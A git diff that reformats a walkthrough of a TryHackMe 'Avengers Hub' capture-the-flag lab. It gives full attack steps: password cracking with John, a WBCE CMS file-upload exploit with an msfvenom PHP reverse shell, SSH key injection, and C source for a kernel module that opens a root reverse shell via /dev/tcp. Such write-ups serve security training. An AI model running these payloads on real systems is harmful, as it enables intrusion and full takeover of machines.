@@ -1,85 +1,180 @@
-Hello guys, welcome to this THM avengers hub room !
+# 🛡️ Hello guys, welcome to this THM *Avengers Hub* write-up!
 
-Before we start to help you :
-MyIp : 10.20.20.20
-TargetIp : 10.30.02.20
+---
 
-we start by scanning the network with NMAP 
+## 🧭 Step 0 – Preparation
 
-```nmap -sV ip ```
+Before diving into the challenge, here’s our setup:
 
-after scanning the network we can see there is SSH port (22) and http port (80) which the one interesting us,
-when we load to the main page we have a loading telling us that site is in maintnance so we need to find.
+- **My IP (attacker)**: `10.20.20.20`  
+- **Target IP (target)**: `10.30.02.20`
 
-Lets scan the differents paths, i use dirsearch but you can use gobuster or other tools !
-```python3 dirsearch.py -u http://10.30.02.20 ```
+---
 
-we have diferent directorys, by navigating to it one by one we fond suspecious zip file that we can download : 
+## 🔎 Step 1 – Scanning the Target with Nmap
 
-Lets try top open it ! 
+To begin, we perform a basic **version scan** using Nmap to detect open ports and identify the services running on the target machine.
 
-When we try to open the ZIP file, it asks for a password. Since we don’t know it, we can try to crack the password using zip2john and john
-```zip2john breakglass.zip > hash.txt```
+```bash
+nmap -sV 10.30.02.20
+```
 
-Then we use john with a popular wordlist (rockyou.txt) to try and crack the password:
-```john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
+> 💡 The `-sV` flag enables service version detection.
 
-Bingo, when we got the password we got this file,
+---
 
-it tells that admin password is : but it encrypted in md5 hash so we need to decrypt it, we will first try to see online tools if they already have this password hash stocked in their data base, if not we will try to crack it !
+## 🌐 Step 2 – Exploring the Web Server
+
+Open port 80 hosts a web server. Visiting it shows a **"Site under maintenance"** message. This usually means there might be hidden directories.
+
+---
+
+## 🧪 Step 3 – Directory Enumeration
+
+Use tools like `dirsearch`, `gobuster`, or `ffuf`. In our case:
+
+```bash
+python3 dirsearch.py -u http://10.30.02.20
+```
+
+We discover a few directories. By exploring them, we find a suspicious file: `breakglass.zip`.
+
+---
+
+## 📦 Step 4 – Cracking the ZIP File
+
+We found a ZIP file, but it’s password-protected. To access its content, we need to crack the password.
+
+First, we use `zip2john`, a tool that extracts a hash from the ZIP file. This hash represents the encrypted password and can be used by John the Ripper.
+
+```bash
+zip2john breakglass.zip > hash.txt
+```
+
+This creates a `hash.txt` file that contains the ZIP’s password hash.
+
+Then, we use `john` (John the Ripper) to try to crack the password using a wordlist — here, we use the classic `rockyou.txt` list:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
 
-Bingo again, we have admin password, lets connect into the admin interface
+## 🧾 Step 5 – Extracting and Decrypting the Admin Password
 
-now we arrive at an interface of WBCE CMS 1.6.2, when googling it we can see there is an exploit by injecting .inc files
-.inc files are used in PHP to include code. If the server treats them like .php, uploading one can lead to executing code on the server
+Inside the ZIP, we find a file with an **MD5 hash** for the admin password. Try to decrypt it online (e.g., https://md5decrypt.net).
+
+🎉 We recover the admin password.
+
+---
+
+## 🧑‍💻 Step 6 – Accessing the Admin Interface (WBCE CMS)
+
+The CMS is **WBCE 1.6.2**. Searching online shows an exploit using `.inc` file upload:
+
 https://www.exploit-db.com/exploits/52039
 
-lets create our own .inc reverse shell with msfvenom
+`.inc` files can be executed like `.php` on misconfigured servers.
 
-msfvenom -p php/reverse_php LHOST=YOUR_MACHINE_IP LPORT=4444 -f raw > shell.inc
+---
 
-now we put our listener : nc -lvnp 4444
+## 🐚 Step 7 – Reverse Shell via WBCE CMS Exploit
 
-after that we upload it in /media/ double click on it and we got the shell !
+Generate a PHP reverse shell in `.inc` format:
 
-executing commands like whoami, tell us we are www-data the webserver user, 
+```bash
+msfvenom -p php/reverse_php LHOST=10.20.20.20 LPORT=4444 -f raw > shell.inc
+```
 
-navigating to /home/ we found an user, listing his directory content we see a flag.txt BUT we cannot open it due to our permission, but something is interesting, we have full rights on the .ssh folder, navigating there we see .authorized_key a file storing the keys autorized to connect to the user via ssh without a password ! since we have the full rights on the file 
-we gonna go back on our machine and create an ssh key
+Set up a listener:
 
-```ssh-keygen -t rsa -b 4096 -f mykey```
+```bash
+nc -lvnp 4444
+```
 
+Upload `shell.inc` to `/media/` in the CMS and trigger it in the browser.
 
-open mykey.pub and copy all the content.
+🎉 You now have a shell as `www-data`.
 
-now go back to your listener shell and do echo "SSH_PUB_KEY" > /home/user/.ssh/authorized_key
+---
 
-and now we can try to connect to the user ssh key to connect to the user : ssh -i mykey user@IP
+## 🧍‍♂️ Step 8 – Privilege Escalation to User
 
+Check who you are:
 
-Bingo, we have user shell, we can cat the flag file with cat flag.txt
+```bash
+whoami
+```
 
+Then look for users:
 
-now we need the root file, obviously we dont have root access or it bee too easy, by executing sudo -l we can see that we can execute .ko file
-.ko files are kernel modules — basically code we can plug directly into the Linux kernel. Since we can load one as sudo, we can write a malicious module that gives us root access when it gets loaded. Game over
-.ko files are developed in C, and only in C so we gonna develope (or get in github) a reverse shell in C, the objective here is to put a listener on another port in our kali machine, when we run our .ko file since it gonna run with root it gonna open reverse shell in root
+```bash
+ls /home/
+```
 
-in the ssh host create the file cyberavengers.c and copy past your code, mine was : 
+Suppose we find the user `void` and the folder `/home/void/.ssh/` is **writable**.
 
-```ccyberavengers.c
+---
+
+## 🔑 Step 9 – SSH Key Injection
+
+On your machine, generate a key:
+
+```bash
+ssh-keygen -t rsa -b 4096 -f mykey
+cat mykey.pub
+```
+
+Copy the content and inject it into the target:
+
+```bash
+echo "PASTE_YOUR_SSH_PUBLIC_KEY_HERE" > /home/void/.ssh/authorized_keys
+```
+
+Then connect via SSH:
+
+```bash
+ssh -i mykey void@10.30.02.20
+```
+
+🎉 You now have user access.
+
+```bash
+cat ~/flag.txt
+```
+
+---
+
+## 👑 Step 10 – Escalating to Root with a Kernel Module
+
+Check what we can do with sudo:
+
+```bash
+sudo -l
+```
+
+We see permission to run `/sbin/insmod`, which loads a `.ko` kernel module.
+
+> ⚠️ Important: The target machine already has `make` and kernel headers, so we’ll compile the module **directly on the target**.
+
+---
+
+## 🛠️ Step 11 – Creating the Kernel Module on the Target
+
+### On the target, create `cyberavengers.c`:
+
+```c
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/kthread.h>
 #include <linux/delay.h>
 
-#define REMOTE_IP "IP"   // Replace with your IP
-#define REMOTE_PORT "8888"      // Replace with your port
+#define REMOTE_IP "10.20.20.20"
+#define REMOTE_PORT "8888"
 
 static int reverse_shell_thread(void *data)
 {
-    /* Commande reverse shell utilisant bash et /dev/tcp */
     char *argv[] = { "/bin/bash", "-c",
         "bash -i >& /dev/tcp/" REMOTE_IP "/" REMOTE_PORT " 0>&1", NULL };
     char *envp[] = { "PATH=/usr/bin:/bin", NULL };
@@ -105,11 +200,14 @@ module_exit(rev_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("CTF Participant");
-MODULE_DESCRIPTION("Module kernel minimaliste pour reverse shell (à usage restreint)");
+MODULE_DESCRIPTION("Kernel module reverse shell");
 ```
 
-create Makefile to compile the c file : 
-```Makefile
+---
+
+### Still on the target, create `Makefile`:
+
+```makefile
 obj-m += cyberavengers.o
 
 all:
@@ -119,17 +217,48 @@ clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
 
-after that put another listener on our 8888 port : 
+---
 
-nc -lvnp 8888 
+## 🧨 Step 12 – Compile and Load the Module
 
-run the sudo command : /sbin/insmod cyberavengers.ko
+### Compile on the target:
 
-and bingo ! you should have a reverse shell in our netcat with root user !
+```bash
+make
+```
 
-the flag is on /root/flag.txt !
+### Set up a listener on your attacker machine:
 
-Have a great day ! 
+```bash
+nc -lvnp 8888
+```
 
+### Run the module on the target:
 
+```bash
+sudo /sbin/insmod cyberavengers.ko
+```
 
+🎉 You should now have a **root reverse shell** on your listener!
+
+---
+
+## 🏁 Final Step – Read the Root Flag
+
+```bash
+cat /root/flag.txt
+```
+
+---
+
+## ✅ Challenge Complete
+
+You've successfully:
+
+- Enumerated services
+- Cracked a ZIP and an MD5 hash
+- Exploited a file upload vulnerability
+- Used SSH key injection for privilege escalation
+- Loaded a malicious kernel module for root
+
+🔥 **Great job and happy hacking!**
